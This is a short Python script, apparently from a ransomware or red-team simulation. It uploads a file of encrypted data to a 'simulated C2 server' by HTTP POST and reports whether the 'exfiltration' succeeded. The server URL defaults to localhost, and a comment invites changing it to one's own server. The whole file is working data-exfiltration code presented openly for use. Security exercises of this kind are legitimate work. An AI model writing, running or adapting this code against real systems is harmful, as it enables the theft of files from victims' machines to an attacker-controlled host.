import requests
import os

# URL of the simulated C2 server (Python http.server or cloud bucket)
C2_SERVER_URL = 'http://127.0.0.1:8000/upload'  # Change to your server URL

# Path to the encrypted folder/file
ENCRYPTED_FILE_PATH = 'path/to/encrypted/files.log'

def exfiltrate_file(file_path):
    with open(file_path, 'rb') as file:
        files = {'file': (os.path.basename(file_path), file)}
        response = requests.post(C2_SERVER_URL, files=files)

    if response.status_code == 200:
        print(f"File {file_path} successfully exfiltrated.")
    else:
        print(f"Failed to exfiltrate {file_path}. Status code: {response.status_code}")

# Call the function
exfiltrate_file(ENCRYPTED_FILE_PATH)
